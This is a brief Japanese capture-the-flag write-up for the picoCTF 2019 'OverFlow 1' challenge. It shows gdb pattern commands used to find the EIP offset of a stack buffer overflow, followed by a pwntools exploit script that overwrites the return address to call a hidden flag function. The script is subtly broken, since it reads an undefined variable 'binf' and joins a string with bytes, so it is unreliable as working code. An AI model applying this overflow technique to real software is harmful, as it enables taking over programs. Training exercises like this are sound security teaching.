# OverFlow 1
## picoCTF2019
## Binary Exploition
***

与えらえるコードから、本来呼ばれないflag関数を呼ぶことが出来ればflagを得ることができるとわかる。  
さっそくgdbで解析していく。まず、
> pattc 100

で適当な文字列を生成する。次に
> run

で入力までいったら、生成した文字列を貼り付ける。するとBOFが起きるため、EIPのアドレスを調べて、
> patto EIPのアドレス

を打つ。これでオフセットが分かる。次にflag関数のアドレスを調べる。
> p flag

で出たアドレスがflag関数のアドレス。  

最後にこれを使ってexploitコードを書く。  
```
from pwn import *
context(arch="i386", os="linux")
p = process("./vuln")
e = ELF("./vuln")
flag_address = binf.symbols[b'flag']
offset = 76
payload = "A"*offset + p32(flag_address)
p.sendline(payload)
p.interactive()
```
これを実行してフラグゲット